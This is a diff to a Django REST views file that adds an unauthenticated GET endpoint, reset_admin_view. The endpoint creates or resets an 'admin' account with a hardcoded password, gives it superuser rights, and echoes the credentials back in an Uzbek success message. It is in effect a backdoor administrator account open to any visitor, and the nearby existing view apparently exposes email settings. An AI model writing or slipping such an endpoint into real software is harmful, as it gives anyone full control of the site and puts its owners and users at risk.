@@ -233,3 +233,26 @@ def test_email_view(request):
                 "EMAIL_HOST_USER": settings.EMAIL_HOST_USER,
             }
         })
+
+from django.contrib.auth import get_user_model
+from rest_framework.response import Response
+
+@api_view(['GET'])
+@permission_classes([AllowAny])
+def reset_admin_view(request):
+    try:
+        User = get_user_model()
+        user, created = User.objects.get_or_create(username='admin')
+        user.set_password('Markaz2026!')
+        user.is_staff = True
+        user.is_superuser = True
+        user.save()
+        return Response({
+            "status": "SUCCESS",
+            "message": "Muvaffaqiyatli! Login: admin, Parol: Markaz2026!"
+        })
+    except Exception as e:
+        return Response({
+            "status": "ERROR",
+            "error_message": str(e)
+        })
